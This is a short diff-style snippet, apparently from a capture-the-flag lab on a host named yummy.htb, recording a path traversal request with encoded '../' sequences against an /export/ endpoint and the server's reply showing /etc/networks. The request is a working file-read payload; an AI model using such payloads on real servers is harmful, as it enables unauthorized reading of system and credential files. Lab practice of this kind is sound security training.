@@ -1,0 +1,4 @@
+URL: http://yummy.htb:80/export/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fnetworks
+Response:
+# symbolic names for networks, see networks(5) for more information
+link-local 169.254.0.0
